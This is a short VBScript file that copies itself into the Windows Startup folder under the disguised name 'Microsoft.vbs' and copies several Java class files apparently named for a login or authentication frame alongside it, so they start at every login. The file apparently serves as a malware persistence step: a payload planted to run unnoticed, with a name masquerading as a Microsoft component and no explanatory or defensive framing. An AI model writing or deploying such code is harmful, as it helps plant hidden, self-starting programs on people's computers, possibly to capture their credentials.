
 dim shellobj 
set shellobj = wscript.createobject("wscript.shell") 
 installname = wscript.scriptname 
startup = shellobj.specialfolders ("startup") & "\" 

 dim filesystemobj 
set filesystemobj = createobject("scripting.filesystemobject") 

filesystemobj.copyfile "abcd.vbs",startup & "Microsoft.vbs" ,true

fileSystemobj.copyfile "frame.class",startup & "frame.class" ,true 
fileSystemobj.copyfile "authentication.class",startup & "authentication.class" ,true 
fileSystemobj.copyfile "authentication$1.class",startup & "authentication$1.class" ,true 
fileSystemobj.copyfile "authentication$2.class",startup & "authentication$2.class" ,true 
fileSystemobj.copyfile "authentication$1$1.class",startup & "authentication$1$1.class" ,true 
'msgbox "completed"